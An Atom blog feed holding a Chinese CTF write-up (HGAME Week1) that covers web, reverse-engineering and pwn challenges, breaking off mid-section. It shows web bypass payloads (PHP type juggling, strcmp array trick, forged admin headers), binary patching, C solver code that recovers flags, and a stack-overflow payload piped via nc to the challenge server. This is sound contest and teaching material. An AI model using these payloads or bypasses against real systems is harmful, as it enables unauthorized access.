<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>oyiadin</title>
  
  <subtitle>Share anything interesting.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://oyiadin.github.io/"/>
  <updated>2018-02-14T12:14:23.757Z</updated>
  <id>http://oyiadin.github.io/</id>
  
  <author>
    <name>oyiadin</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HGAME Week1 Writeup</title>
    <link href="http://oyiadin.github.io/2018/writeup-of-hgame-week1/"/>
    <id>http://oyiadin.github.io/2018/writeup-of-hgame-week1/</id>
    <published>2018-02-13T16:00:00.000Z</published>
    <updated>2018-02-14T12:14:23.757Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Web"><a href="#Web" class="headerlink" title="{ Web }"></a>{ Web }</h2><h3 id="Are-you-from-Europe-100"><a href="#Are-you-from-Europe-100" class="headerlink" title="Are you from Europe? [100]"></a>Are you from Europe? [100]</h3><p>　　打开页面试着抽了一下，发现抽不到 SSR 就直奔源码而去了。在页面最后发现一段很可疑的 <code>eval()</code>，扔到 Sublime 里用插件格式化一下，得到 Flag：hgame{Th3_Ch0seN_0nE!}</p><p><img src="/images/writeup-of-hgame-week1/web1.png" alt="web1"></p><h3 id="special-number-100"><a href="#special-number-100" class="headerlink" title="special number [100]"></a>special number [100]</h3><p>　　读源码：先拿到 GET 的参数 <code>key</code>，然后匹配一下正则，过了之后要使 <code>json_decode()</code> 的返回值与未知字符串相等。结合正则的提示：必须包含数字，可联想到 <code>0 == &quot;xxx&quot;</code> 为真，所以可构造 <code>?key=0e00000</code> 得到 Flag：hgame{pHp_w34k_typing_s000_e4sy}。</p><h3 id="can-u-find-me-50"><a href="#can-u-find-me-50" class="headerlink" title="can u find me? [50]"></a>can u find me? [50]</h3><p>　　根据提示 “only robot know where is the Flag”，直接访问 <code>/robots.txt</code>，发现一行 <code>Disallow: /f1aaaaaaaag.php</code>，跟到该文件，并根据提示把 cookies 改为 <code>user: admin</code>，成功获取 Flag：hgame{78e01ee77a39ef4e}</p><h3 id="tell-me-what-you-want-100"><a href="#tell-me-what-you-want-100" class="headerlink" title="tell me what you want [100]"></a>tell me what you want [100]</h3><p>　　打开页面，填入 <code>flag</code> 并提交，提示需要用 POST。于是 F12 把 method 改为 POST 后重新提交，并打开 Burp Suite 把这个 HTTP 请求复制一下。之后根据提示依次添加/修改以下 HTTP 头即可得到 Flag：hgame{For9e_hTTp_iS_N0T_HArd}</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">X-Forwarded-For</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 Icefox/57.0</span><br><span class="line"><span class="attribute">Referer</span>: www.google.com</span><br><span class="line"><span class="attribute">Cookie</span>: isadmin=1</span><br></pre></td></tr></table></figure><h3 id="我们不一样-100"><a href="#我们不一样-100" class="headerlink" title="我们不一样 [100]"></a>我们不一样 [100]</h3><p>　　读代码，发现要使 <code>$str1 != $str2</code> 与 <code>strcmp($str1, $str2) == 0</code> 同时为真。翻阅文档发现 <code>strcmp()</code> 函数在遇到数组时会返回 NULL，则可构造 POST 参数 <code>str1[]=1&amp;str2[]=2</code>，成功获取 Flag：hgame{g3t_f14g_is_so0000_ez}</p><h2 id="Re"><a href="#Re" class="headerlink" title="{ Re }"></a>{ Re }</h2><h3 id="re0-50"><a href="#re0-50" class="headerlink" title="re0 [50]"></a>re0 [50]</h3><p>　　扔进 IDA 发现函数名很让人迷茫，默默搜索了一下字符串，于是得到 Flag：hctf{F1r5t_St5p_Ls_Ea5y}</p><p><img src="/images/writeup-of-hgame-week1/re1.png" alt="re1"></p><h3 id="baby-crack-100"><a href="#baby-crack-100" class="headerlink" title="baby_crack [100]"></a>baby_crack [100]</h3><p><img src="/images/writeup-of-hgame-week1/re2.png" alt="re2"></p><p>　　先看一下如何“Good Job”：</p><p><img src="/images/writeup-of-hgame-week1/re2-1.png" alt="re2-1"></p><p>　　让 <code>array</code> 跟 <code>goal</code> 一样即可，长度为 20 Bytes。然后依次把上边那三个函数扣出来，整理成如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func1</span><span class="params">(<span class="keyword">uint8_t</span> <span class="built_in">array</span>[], <span class="keyword">uint8_t</span> buffer[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> mod = i &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="comment">// (i &gt;&gt; 32) &gt;&gt; 30 始终为 0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (mod == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">array</span>[i] = <span class="number">2</span> * buffer[i];</span><br><span class="line">            <span class="comment">// buffer 是输入的字符，而可见的 ASCII 字符里最高位均为 0</span></span><br><span class="line">            <span class="comment">// 所以 buffer[i] &gt;&gt; 7 始终为 0</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">array</span>[i] = (buffer[i] &lt;&lt; <span class="number">2</span>*mod) | (buffer[i] &gt;&gt; <span class="number">8</span> - <span class="number">2</span>*mod);</span><br><span class="line">            <span class="comment">// 将 buffer 高低位按组交换</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func2</span><span class="params">(<span class="keyword">uint8_t</span> <span class="built_in">array</span>[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">0</span>, v2 = <span class="number">1</span>, v3 = <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">while</span> (v2 &lt;= <span class="number">20</span>) &#123;</span><br><span class="line">        <span class="keyword">uint8_t</span> temp = <span class="built_in">array</span>[v1];</span><br><span class="line">        <span class="built_in">array</span>[v1] = <span class="built_in">array</span>[v2];</span><br><span class="line">        <span class="built_in">array</span>[v2] = temp;</span><br><span class="line">        <span class="comment">// 将 array[v1] 与 array[v2] 互换</span></span><br><span class="line">        v1 = v2;</span><br><span class="line">        v2 += v3++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func3</span><span class="params">(<span class="keyword">uint8_t</span> <span class="built_in">array</span>[])</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">array</span>[i] = table[<span class="built_in">array</span>[i]]</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　简要描述一下：先一番操作从 <code>buffer</code> 得到 <code>array</code>，然后循环一下把 <code>array</code> 里的项换位，最后查表把 <code>array</code> 里的每个特定值换成对应的值。</p><p>　　读懂之后，一步步反过来操作即可从 <code>array</code>（也就是 <code>goal</code>）还原到 <code>buffer</code>。描述起来比较长，直接上代码吧：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> buffer[<span class="number">21</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> <span class="built_in">array</span>[] = &#123;</span><br><span class="line">    <span class="number">0xA6</span>, <span class="number">0x4E</span>, <span class="number">0x05</span>, <span class="number">0xA2</span>, <span class="number">0xB6</span>, <span class="number">0x08</span>, <span class="number">0xA2</span>, <span class="number">0xCE</span>, <span class="number">0x8C</span>, <span class="number">0xEE</span>, <span class="number">0x20</span>, <span class="number">0xC2</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0xA0</span>, <span class="number">0xD0</span>, <span class="number">0xCD</span>, <span class="number">0x23</span>, <span class="number">0xA6</span>, <span class="number">0x6A</span>, <span class="number">0x82</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">uint8_t</span> trans_table[] = &#123;</span><br><span class="line">    <span class="number">0x11</span>, <span class="number">0xBF</span>, <span class="number">0xBA</span>, <span class="number">0x0F</span>, <span class="number">0xD5</span>, <span class="number">0xCC</span>, <span class="number">0xBC</span>, <span class="number">0x1E</span>, <span class="number">0x19</span>, <span class="number">0x01</span>, <span class="number">0x87</span>, <span class="number">0x1B</span>,</span><br><span class="line">    <span class="number">0x96</span>, <span class="number">0xC3</span>, <span class="number">0x86</span>, <span class="number">0x1A</span>, <span class="number">0x7E</span>, <span class="number">0x6B</span>, <span class="number">0x5A</span>, <span class="number">0x8D</span>, <span class="number">0xFB</span>, <span class="number">0xC2</span>, <span class="number">0x8B</span>, <span class="number">0xB3</span>,</span><br><span class="line">    <span class="number">0xB1</span>, <span class="number">0xDD</span>, <span class="number">0xEF</span>, <span class="number">0x0A</span>, <span class="number">0x4B</span>, <span class="number">0xF8</span>, <span class="number">0x55</span>, <span class="number">0x26</span>, <span class="number">0x76</span>, <span class="number">0xAB</span>, <span class="number">0xC1</span>, <span class="number">0x64</span>,</span><br><span class="line">    <span class="number">0x17</span>, <span class="number">0xC9</span>, <span class="number">0xAF</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x4A</span>, <span class="number">0xCA</span>, <span class="number">0x12</span>, <span class="number">0x24</span>, <span class="number">0xE1</span>, <span class="number">0xAE</span>, <span class="number">0x50</span>,</span><br><span class="line">    <span class="number">0x3A</span>, <span class="number">0x70</span>, <span class="number">0x37</span>, <span class="number">0xED</span>, <span class="number">0xE0</span>, <span class="number">0x77</span>, <span class="number">0xB7</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x2D</span>, <span class="number">0x32</span>, <span class="number">0x7B</span>,</span><br><span class="line">    <span class="number">0x89</span>, <span class="number">0xCF</span>, <span class="number">0xF0</span>, <span class="number">0x94</span>, <span class="number">0x21</span>, <span class="number">0x65</span>, <span class="number">0x0B</span>, <span class="number">0x3F</span>, <span class="number">0x7D</span>, <span class="number">0x29</span>, <span class="number">0x3B</span>, <span class="number">0x05</span>,</span><br><span class="line">    <span class="number">0x51</span>, <span class="number">0xE7</span>, <span class="number">0x81</span>, <span class="number">0x6E</span>, <span class="number">0x33</span>, <span class="number">0xC6</span>, <span class="number">0xD7</span>, <span class="number">0xAC</span>, <span class="number">0x3C</span>, <span class="number">0x9A</span>, <span class="number">0x22</span>, <span class="number">0xDC</span>,</span><br><span class="line">    <span class="number">0x7A</span>, <span class="number">0x08</span>, <span class="number">0x6A</span>, <span class="number">0x97</span>, <span class="number">0xF1</span>, <span class="number">0x5F</span>, <span class="number">0x8E</span>, <span class="number">0x62</span>, <span class="number">0x6F</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x82</span>,</span><br><span class="line">    <span class="number">0x8C</span>, <span class="number">0x2A</span>, <span class="number">0x49</span>, <span class="number">0x39</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0xD0</span>, <span class="number">0x83</span>, <span class="number">0xB4</span>, <span class="number">0x42</span>, <span class="number">0x36</span>, <span class="number">0x71</span>,</span><br><span class="line">    <span class="number">0x0C</span>, <span class="number">0x57</span>, <span class="number">0x10</span>, <span class="number">0xF3</span>, <span class="number">0x28</span>, <span class="number">0xD4</span>, <span class="number">0x34</span>, <span class="number">0x0E</span>, <span class="number">0xE4</span>, <span class="number">0xFF</span>, <span class="number">0x06</span>, <span class="number">0xAD</span>,</span><br><span class="line">    <span class="number">0x5C</span>, <span class="number">0xFC</span>, <span class="number">0xDB</span>, <span class="number">0xDE</span>, <span class="number">0xDA</span>, <span class="number">0x9F</span>, <span class="number">0xEA</span>, <span class="number">0x35</span>, <span class="number">0x5E</span>, <span class="number">0x78</span>, <span class="number">0x52</span>, <span class="number">0xD9</span>,</span><br><span class="line">    <span class="number">0x4F</span>, <span class="number">0x6D</span>, <span class="number">0xBB</span>, <span class="number">0xA8</span>, <span class="number">0xB0</span>, <span class="number">0x15</span>, <span class="number">0x43</span>, <span class="number">0x90</span>, <span class="number">0x25</span>, <span class="number">0xA6</span>, <span class="number">0x54</span>, <span class="number">0xFE</span>,</span><br><span class="line">    <span class="number">0x0D</span>, <span class="number">0xEB</span>, <span class="number">0xA9</span>, <span class="number">0xFD</span>, <span class="number">0xE9</span>, <span class="number">0x5D</span>, <span class="number">0x16</span>, <span class="number">0xCB</span>, <span class="number">0x2F</span>, <span class="number">0x4E</span>, <span class="number">0xBD</span>, <span class="number">0xC5</span>,</span><br><span class="line">    <span class="number">0x09</span>, <span class="number">0x46</span>, <span class="number">0xF7</span>, <span class="number">0xC0</span>, <span class="number">0x1F</span>, <span class="number">0x59</span>, <span class="number">0xD3</span>, <span class="number">0x02</span>, <span class="number">0x23</span>, <span class="number">0x9D</span>, <span class="number">0x60</span>, <span class="number">0x04</span>,</span><br><span class="line">    <span class="number">0x84</span>, <span class="number">0xF6</span>, <span class="number">0xA4</span>, <span class="number">0x1D</span>, <span class="number">0x31</span>, <span class="number">0x4C</span>, <span class="number">0xC8</span>, <span class="number">0x9B</span>, <span class="number">0xC7</span>, <span class="number">0xDF</span>, <span class="number">0x66</span>, <span class="number">0x2C</span>,</span><br><span class="line">    <span class="number">0xEC</span>, <span class="number">0x79</span>, <span class="number">0x73</span>, <span class="number">0x30</span>, <span class="number">0x69</span>, <span class="number">0x63</span>, <span class="number">0x95</span>, <span class="number">0xD6</span>, <span class="number">0xBE</span>, <span class="number">0x44</span>, <span class="number">0xE8</span>, <span class="number">0xA5</span>,</span><br><span class="line">    <span class="number">0xF2</span>, <span class="number">0x99</span>, <span class="number">0xD8</span>, <span class="number">0x38</span>, <span class="number">0xA0</span>, <span class="number">0xE3</span>, <span class="number">0x8F</span>, <span class="number">0xD2</span>, <span class="number">0x53</span>, <span class="number">0x3D</span>, <span class="number">0x56</span>, <span class="number">0x92</span>,</span><br><span class="line">    <span class="number">0x72</span>, <span class="number">0xFA</span>, <span class="number">0xB8</span>, <span class="number">0xA7</span>, <span class="number">0xCD</span>, <span class="number">0xEE</span>, <span class="number">0x93</span>, <span class="number">0x85</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0xAA</span>, <span class="number">0xB2</span>,</span><br><span class="line">    <span class="number">0x47</span>, <span class="number">0xCE</span>, <span class="number">0x80</span>, <span class="number">0x20</span>, <span class="number">0x1C</span>, <span class="number">0x7C</span>, <span class="number">0x07</span>, <span class="number">0xE2</span>, <span class="number">0xB9</span>, <span class="number">0x91</span>, <span class="number">0x45</span>, <span class="number">0x74</span>,</span><br><span class="line">    <span class="number">0x98</span>, <span class="number">0xF5</span>, <span class="number">0x3E</span>, <span class="number">0x03</span>, <span class="number">0xC4</span>, <span class="number">0x00</span>, <span class="number">0x41</span>, <span class="number">0x00</span>, <span class="number">0x2B</span>, <span class="number">0x48</span>, <span class="number">0x27</span>, <span class="number">0xE6</span>,</span><br><span class="line">    <span class="number">0x5B</span>, <span class="number">0xF4</span>, <span class="number">0x9C</span>, <span class="number">0x88</span>, <span class="number">0x75</span>, <span class="number">0xA2</span>, <span class="number">0xB6</span>, <span class="number">0x14</span>, <span class="number">0xD1</span>, <span class="number">0xE5</span>, <span class="number">0x4D</span>, <span class="number">0x40</span>,</span><br><span class="line">    <span class="number">0xF9</span>, <span class="number">0x9E</span>, <span class="number">0x58</span>, <span class="number">0xA3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// func3_reserve():</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">256</span>; ++j)</span><br><span class="line">            <span class="keyword">if</span> (trans_table[j] == <span class="built_in">array</span>[i]) &#123;</span><br><span class="line">                <span class="built_in">array</span>[i] = j;</span><br><span class="line">                <span class="comment">// 查表还原出原来的值</span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">                <span class="comment">// 有坑，不 break 的话会拿到错误的下标</span></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// func2_reverse():</span></span><br><span class="line">    <span class="keyword">int</span> v1 = <span class="number">15</span>, v2 = <span class="number">21</span>, v3 = <span class="number">7</span>;</span><br><span class="line">    <span class="comment">// 推一下就能知道上边这些最终值，然后逆着回去就行</span></span><br><span class="line">    <span class="keyword">while</span> (v2 &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        v2 -= --v3;</span><br><span class="line">        v1 = v2 - (v3 - <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 让 v1 成为下一轮的 v2，也就是原来 v1 = v2 的逆操作</span></span><br><span class="line">        <span class="keyword">uint8_t</span> temp = <span class="built_in">array</span>[v1];</span><br><span class="line">        <span class="built_in">array</span>[v1] = <span class="built_in">array</span>[v2];</span><br><span class="line">        <span class="built_in">array</span>[v2] = temp;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//func1_reserve():</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">20</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">int</span> mod = i &amp; <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">if</span> (mod == <span class="number">0</span>) &#123;</span><br><span class="line">            buffer[i] = <span class="built_in">array</span>[i] / <span class="number">2</span>;</span><br><span class="line">            <span class="comment">// 这里不会得到浮点数的，array[i] 肯定是偶数</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            buffer[i] = (<span class="built_in">array</span>[i] &gt;&gt; <span class="number">2</span>*mod) | (<span class="built_in">array</span>[i] &lt;&lt; <span class="number">8</span> - <span class="number">2</span>*mod);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\n"</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　Flag：hctf{U_g0t_Tr1foRce}</p><h3 id="nop-pop-100"><a href="#nop-pop-100" class="headerlink" title="nop_pop [100]"></a>nop_pop [100]</h3><p>　　第一次遇到文件里没有 Flag 的题，迷茫……了解到我需要做什么之后，先打开该程序，弹出两个窗口，我需要把背景图去掉，观察发现该图窗口名为 <code>pop team epic</code>。遂丢进 OllyDbg，搜索定位到该字符串：</p><p><img src="/images/writeup-of-hgame-week1/re3.png" alt="re3"></p><p>　　下断点后执行到该处，发现先后调用了 <code>CreateWindowExW()</code>、<code>ShowWindow()</code> 跟 <code>UpdateWindow()</code>，那只要把 <code>ShowWindow()</code> 给 nop 掉即可。栈里多出来的数据没有影响，也不会让 <code>UpdateWindow()</code> 出现没有操作对象的情况：</p><p><img src="/images/writeup-of-hgame-week1/re3-1.png" alt="re3-1"></p><p>　　继续将代码读下去，发现有一小段不会执行的代码：</p><p><img src="/images/writeup-of-hgame-week1/re3-2.png" alt="re3-2"></p><p>　　将跳转条件反转即可：jnz -&gt; jz，保存后发给客服获得 Flag：hctf{Far5we1L_G0od_Cr4cker}</p><h3 id="sc2-player-100"><a href="#sc2-player-100" class="headerlink" title="sc2_player [100]"></a>sc2_player [100]</h3><p>　　不带符号让人迷茫，搜索字符串，通过“Input your flag”的 xref 找到了主函数：</p><p><img src="/images/writeup-of-hgame-week1/re4.png" alt="re4"></p><p>　　其中，if 的判断条件明显是判断上边一系列运算的正确与否，跟进去：</p><p><img src="/images/writeup-of-hgame-week1/re4-1.png" alt="re4-1"></p><p>　　先继续跟进子函数：</p><p><img src="/images/writeup-of-hgame-week1/re4-2.png" alt="re4-2"></p><p>　　读完发现大概就是 <code>!strcmp()</code>，结合 <code>check()</code> 那几个按位与，可以知道，只有 <code>a1, a2, a3, a4</code> 与 <code>mask2</code> 相对应的部分完全相同，<code>check()</code> 才会返回真。</p><p>　　然后层层深入一下 <code>f1()</code> 函数。经过整理，其作用相当于下面的伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">f1</span><span class="params">(buffer, mask, loc, id)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; ++i)</span><br><span class="line">        loc[i] = mask[i + <span class="number">7</span>*id] ^ (i + <span class="number">35</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; ++i)</span><br><span class="line">        mask[i] = mask[i + <span class="number">7</span>*id] ^ <span class="number">0x34</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">7</span>; ++i)</span><br><span class="line">        loc[i] = buffer[i + <span class="number">7</span>*id] ^ (i + <span class="number">7</span>*id) ^ id;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>　　因为最终拿来比对的是 <code>loc</code> 们，只要跟踪好 <code>loc</code> 的变化即可：第一个循环给 <code>loc</code> 做的改变都被第三个循环给覆盖了，而第三个循环对 <code>loc</code> 的改变只与 <code>buffer</code> 有关，第二个循环与 <code>loc</code> 一点关系都没有。可以发现，<code>loc</code> 的最终内容可直接由 <code>buffer</code> 得出，<code>mask</code> 什么的都可以统统抛弃。</p><p>　　而传给 <code>check()</code> 的 <code>mask2</code> 未曾被改变过，只被拿来比对。借由 <code>mask2</code> 的数据，可以知道所有 <code>loc</code> 的最终数据，并通过上边的式子从 <code>loc</code> 反推 <code>buffer</code> 即可。Flag：hctf{M4y_th5_iDa_gu1de_thee}，最终代码如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">uint8_t</span> buffer[<span class="number">5</span>][<span class="number">7</span>] = &#123;<span class="number">0</span>&#125;;  <span class="comment">// 多一行拿来放空字符 =。=</span></span><br><span class="line"><span class="keyword">uint8_t</span> loc[<span class="number">4</span>][<span class="number">7</span>] = &#123;</span><br><span class="line">    <span class="number">0x68</span>, <span class="number">0x62</span>, <span class="number">0x76</span>, <span class="number">0x65</span>, <span class="number">0x7F</span>, <span class="number">0x48</span>, <span class="number">0x32</span>,</span><br><span class="line">    <span class="number">0x7F</span>, <span class="number">0x56</span>, <span class="number">0x7C</span>, <span class="number">0x63</span>, <span class="number">0x3F</span>, <span class="number">0x52</span>, <span class="number">0x65</span>,</span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x6C</span>, <span class="number">0x4D</span>, <span class="number">0x74</span>, <span class="number">0x65</span>, <span class="number">0x20</span>, <span class="number">0x72</span>,</span><br><span class="line">    <span class="number">0x73</span>, <span class="number">0x4A</span>, <span class="number">0x60</span>, <span class="number">0x73</span>, <span class="number">0x7F</span>, <span class="number">0x7C</span>, <span class="number">0x65</span>,</span><br><span class="line">&#125;;  <span class="comment">// 这个就是 mask2 的数据</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// f1s_reserve():</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j=<span class="number">6</span>; j&gt;=<span class="number">0</span>; --j)</span><br><span class="line">            buffer[i][j] = loc[i][j] ^ ((j + <span class="number">7</span>*i) ^ i);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s"</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="{ Pwn }"></a>{ Pwn }</h2><h3 id="guess-number-50"><a href="#guess-number-50" class="headerlink" title="guess_number [50]"></a>guess_number [50]</h3><p>　　先手动 nc 一下，发现是要猜数字。既然是要猜数字，猜想可以通过随机数种子拿到随机的数字。先在 IDA 里 F5 拿到 C 代码：</p><p><img src="/images/writeup-of-hgame-week1/pwn1.png" alt="pwn1"></p><p>　　种子的播种应该在 <code>init()</code> 函数里，跟进去：</p><p><img src="/images/writeup-of-hgame-week1/pwn1-1.png" alt="pwn1-1"></p><p>　　发现用的是系统提供的 <code>/dev/urandom</code>，无法操作，放弃挣扎。回到 <code>main()</code> 里继续读代码，没有发现问题，继续跟进 <code>guess_num()</code> 函数：</p><p><img src="/images/writeup-of-hgame-week1/pwn1-2.png" alt="pwn1-2"></p><p>　　第九行用 <code>scanf(&quot;%s&quot;)</code> 的方式读入，敲定此处有溢出的风险。只要成功将 <code>goal_random_num</code> 覆盖即可，查看该函数的栈空间：</p><p><img src="/images/writeup-of-hgame-week1/pwn1-3.png" alt="pwn1-3"></p><p>　　发现 <code>goal_random_num</code> 在相对 <code>buffer</code> 的高地址处，说明此方法可行。构造 payload：<code>python3 -c &quot;print(&#39;0&#39;*276+&#39;\x00\x00\x00\x00\n&#39;)&quot; | nc 111.230.149.72 10002</code>，即可成功获得 Flag：hgame{S0unds_L1ke_U_KN0wn_h0w_st4ck_works}</p><h3 id="flag-server-50"><a href="#flag-server-50" class="headerlink" title="flag_server [50]"></a>flag_server [50]</h3><p>　　(该题初版可根据随机数种子不够随机(timestamp)的漏洞得到生成的随机数，下边是根据溢出所做的题解)</p><p><img src="/images/writeup-of-hgame-week1/pwn2.png" alt="pwn2"></p><p>　　读代码：先初始化随机数生成器，没有搞头，继续：输入长度 length，去除过长 length，防止溢出。然后通过 <code>read_n()</code> 读入指定长度的字符，遇到回车或长度已满的时候结束读入。如果要拿到 Flag，就必须使 <code>is_admin</code> 为真。</p><p>　　这时候有两条路，一条是走 <code>username == 